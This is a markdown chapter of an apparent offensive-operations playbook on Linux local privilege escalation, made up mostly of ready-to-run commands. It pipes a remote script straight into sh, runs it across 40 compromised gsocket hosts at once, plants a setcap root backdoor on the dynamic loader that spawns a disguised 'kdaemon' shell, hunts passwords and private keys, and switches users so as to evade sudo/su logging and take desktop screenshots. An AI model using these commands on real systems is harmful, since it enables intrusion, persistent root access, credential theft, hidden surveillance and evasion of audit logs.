# 10 — Local Privilege Escalation

> Authorized use only. Run local enum first, escalate only within scope.

---

## §suid — Find SUID/SGID binaries

```bash
find / -xdev -type f -perm /6000 -ls 2>/dev/null
```
Cross-reference results with GTFOBins for known privesc paths.

---

## §writable-dirs — Find writable directories

```bash
wfind() {
    local arr dir
    arr=("$@")
    while [[ ${#arr[@]} -gt 0 ]]; do
        dir=${arr[${#arr[@]}-1]}
        unset "arr[${#arr[@]}-1]"
        find "$dir" -maxdepth 1 -type d -writable -ls 2>/dev/null
        IFS=$'\n' arr+=($(find "$dir" -mindepth 1 -maxdepth 1 -type d ! -writable 2>/dev/null))
    done
}
# wfind /
# wfind /etc /var /usr
```

---

## §linpeas — Full local privesc sweep

```bash
# fetch (needs internet) or transfer via 06-exfil methods:
curl -fsSL https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
# better: save output to loot for offline analysis:
curl -fsSL https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh | tee "$COBRA_LOOT_DIR/linpeas-$(date +%s).log"
```
**Long output** — always tee to a loot file and read the summary, not the raw dump.

**Run linpeas across many gsocket hosts (40 workers):**
```bash
cat secrets.txt | xargs -P40 -I{} --process-slot-var=SLOT bash -c \
  'mkdir host_{}; gsexec {} "curl -fsSL https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh" >host_{}/linpeas.log 2>>"linpeas-${SLOT}.err"'
```

---

## §setcap-loader — Loader setcap root backdoor

See `04-persistence.md` §local-root for the full setcap-on-loader and suid-sh techniques.

**Quick reference:**
```bash
# as root:
fn="$(readlink -f /lib64/ld-*.so.*)" || fn="$(readlink -f /lib/ld-*.so.*)" || fn="/lib/ld-linux.so.2"
setcap cap_setuid,cap_setgid+ep "${fn}"
# as non-root → root:
"${fn}" "$(command -v python3)" -c 'import os;os.setuid(0);os.setgid(0);os.execlp("bash","kdaemon")'
```

---

## §password-hunting — Local password sources

- `grep -HEronasi '.{,16}password.{,64}' .` (see `01-recon.md` §password-grep)
- PassDetective — passwords in `~/.*history`
- Chrome-ABE — decrypt Chrome passwords from running process (Windows)
- chrome-password-decryptor — browser password extraction
- `grep -r -F -- " PRIVATE KEY-----" .` — TLS/SSH keys

---

## §xsu — Change user without sudo/su (root only)

Drop to another user's UID/GID directly via python — useful when `sudo`/`su` are
restricted or logged, e.g. to take X11 screenshots as the desktop user.

```bash
xsu() {
    local name="${1:?}"
    local u g h
    local cmd="python"
    command -v python3 >/dev/null && cmd="python3"
    [ $UID -ne 0 ] && { echo >&2 "Need root"; return; }
    u=$(id -u ${name:?}) || return
    g=$(id -g ${name:?}) || return
    h="$(grep "^${name}:" /etc/passwd | cut -d: -f6)" || return
    HOME="${h:-/tmp}" "$cmd" -c "import os;os.setgid(${g:?});os.setuid(${u:?});os.execlp('bash', 'bash')"
}
# xsu joe        # become user 'joe' (as root, no sudo/su in logs)
```

**Use case:** `xwd -display :0 -silent -root | convert - jpg:shot.jpg` or
`import -display :0 -window root shot.png` as the logged-in desktop user.
**OPSEC:** bypasses sudo/su logging, but the resulting shell runs as the target user —
actions are attributable to them. Record in the brain.
